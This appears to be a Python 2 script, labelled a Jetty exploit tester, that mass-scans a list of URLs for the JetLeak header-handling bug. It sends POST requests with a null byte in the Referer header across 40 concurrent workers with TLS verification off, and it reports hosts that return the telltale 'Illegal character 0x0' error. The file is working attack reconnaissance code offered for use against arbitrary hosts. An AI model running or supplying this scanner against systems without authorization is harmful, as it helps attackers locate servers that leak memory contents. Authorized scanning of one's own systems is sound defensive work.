#!/usr/bin/python
'''
Jetty exploit tester (by arbit).
'''
import sys
import requests
from gevent.pool import Pool
import gevent.monkey
gevent.monkey.patch_all()

if len(sys.argv) < 2:
    print("Usage: jetleak_tester.py [urls.txt]")
    sys.exit(1)

with open(sys.argv[1]) as temp_file:
    urls= [line.rstrip('\n') for line in temp_file]

print "Attempting exploit against %s urls" % (len(urls))
pool = Pool(40)
querymap = []

def exploit(url):
    try:
        x = "\x00"
        headers = {"Referer": x, "Connection": "Close"}
        response = requests.post(url, timeout=2, headers=headers, verify=False) 
        if (response.status_code == 400 and ("Illegal character 0x0 in state" in response.text)):
            print 'Vulnerable: %s' % (url)
    except:
        pass

for url in urls:
   pool.spawn(exploit, url)

print 'done'

